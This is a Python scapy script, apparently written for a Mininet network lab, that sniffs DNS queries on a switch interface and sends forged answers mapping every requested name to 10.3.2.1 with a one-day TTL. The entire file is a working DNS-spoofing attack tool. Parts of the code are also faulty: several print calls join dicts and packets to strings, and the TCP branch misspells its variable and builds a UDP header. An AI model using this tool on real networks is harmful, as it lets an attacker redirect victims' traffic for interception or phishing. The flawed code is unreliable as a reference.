#!/usr/bin/env python
# code inspired by Nik Alleyne (https://www.securitynik.com/2014/05/building-your-own-tools-with-scapy.html)
# dnsSpoof.py

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *


# def osCheck():
#  if ( uname()[0].strip() == 'Linux' ) or ( uname()[0].strip() == 'linux ') :
#   print(' Current system is Linux ... Good to go!!')
#  else:
#   print(' Not a Linux system ... Exiting ')
#   print(' This script is designed to work on Linux ... if you wish you can modify it for your OS ')
#   exit(0)


# def usage():
#  print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
#  print(" e.g. ./dnsSpoof eth0 10.0.0.1")


def main():

    while 1:
        # Sniff the network for destination port 53 traffic
        print(' Sniffing for DNS Packet ')
        s1iface = "s1-eth1"
        DNSPacket = sniff(iface=s1iface, filter="dst port 53", count=1)

        pkt = DNSPacket[0]

        print(pkt.getlayer(Ether).fields + '\n')
        print(pkt.getlayer(IP).fields + '\n')
        print(pkt.getlayer(UDP).fields + '\n')
        print(pkt.getlayer(DNS).fields + '\n')

        # h1's MAC address
        clientHwAddr = pkt.getlayer(Ether).src

        # h3's MAC address
        spoofedHwAddr = pkt.getlayer(Ether).dst

        spoofedEtherPkt = Ether(src=spoofedHwAddr, dst=clientHwAddr)

        # if the sniffed packet is a DNS Query, let's do some work
        if (pkt.haslayer(DNS)) and (pkt.getlayer(DNS).qr == 0) and (pkt.getlayer(DNS).qd.qtype == 1) and (pkt.getlayer(DNS).qd.qclass == 1):
            print('\n Got Query on %s ' % ctime())

            # Extract the src IP
            clientSrcIP = pkt.getlayer(IP).src

            # Extract UDP or TCP Src port
            if pkt.haslayer(UDP):
                clientSrcPort = pkt.getlayer(UDP).sport
            elif pkt.haslayer(TCP):
                clientSrcPort = pkt.getlayer(TCP).sport
            else:
                pass
                # I'm not tryint to figure out what you are ... moving on


            # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
            clientDNSQueryID = pkt.getlayer(DNS).id

            # Extract the Query Count
            clientDNSQueryDataCount = pkt.getlayer(DNS).qdcount

            # Extract client's current DNS server
            clientDNSServer = pkt.getlayer(IP).dst

            # Extract the DNS Query. Obviously if we will respond to a domain query, we must reply to what was asked for.
            clientDNSQuery = pkt.getlayer(DNS).qd.qname

            print(' Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n Current DNS Server:%s \n DNS Query:%s ' % (
                clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery))

            # Now that we have captured the clients request information. Let's go ahead and build our spoofed response
            # First let's set the spoofed source, which we will take from the 3rd argument entered at the command line
            spoofedDNSServerIP = "10.2.1.1"

            fakeLocalIP = "10.3.2.1"
            # Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
            spoofedIPPkt = IP(src=spoofedDNSServerIP, dst=clientSrcIP)

            # Now let's move up the IP stack and build our UDP or TCP header
            # We know our source port will be 53. However, our destination port has to match our client's.
            # In addition, we don't know if this is UDP or TCP, so let's ensure we capture both

            if pkt.haslayer(UDP):
                spoofedUDP_TCPPacket = UDP(sport=53, dport=clientSrcPort)
            elif pkt.haslayer(TCP):
                spoofedUDP_TCPPPacket = UDP(sport=53, dport=clientSrcPort)


            del (pkt[IP].len)
            del (pkt[IP].chksum)
            del (pkt[UDP].len)
            del (pkt[UDP].chksum)
            reply = pkt.copy()

            # Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
            # opcode: the type of query (0 for standard). According to RFC, "This value is set by the originator of a query
            #  and copied into the response."
            # RFC: "Authoritative Answer - this bit is valid in responses"
            # spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=pkt.getlayer(DNS).opcode,aa=1,\
            #  #
            #                        rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=0,arcount=0,qd=DNSQR(qname=clientDNSQuery,qtype=pkt.getlayer(DNS).qd.qtype,qclass=pkt.getlayer(DNS).qd.qclass))
            
            # qr (Question/Response) = 1 as it is a response
            reply[DNS].qr = 1
            # rcode (return code) = 0 as no format error
            reply[DNS].rcode = 0
            # ra (recursive available)
            reply[DNS].ra = 1
            # ancount (answer count)
            reply[DNS].ancount = 1
            reply[DNS].an = DNSRR(rrname=clientDNSQuery,type = 'A', rclass = 'IN', rdata=fakeLocalIP, ttl=86400)
            
            

            spoofedDNSPakcet = reply[DNS]

            # Now that we have built our packet, let's go ahead and send it on its merry way.
            print(' \n Sending spoofed response packet ')
            sendp(spoofedEtherPkt/spoofedIPPkt/spoofedUDP_TCPPacket /
                  spoofedDNSPakcet, iface=s1iface, count=1)
            print(spoofedEtherPkt + '\n')
            print(spoofedIPPkt + '\n')
            print(spoofedUDP_TCPPacket + '\n')
            print(spoofedDNSPakcet + '\n')

            print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' % \
              (spoofedDNSServerIP, 53, clientSrcPort))

        else:
            pass


if __name__ == '__main__':
    main()
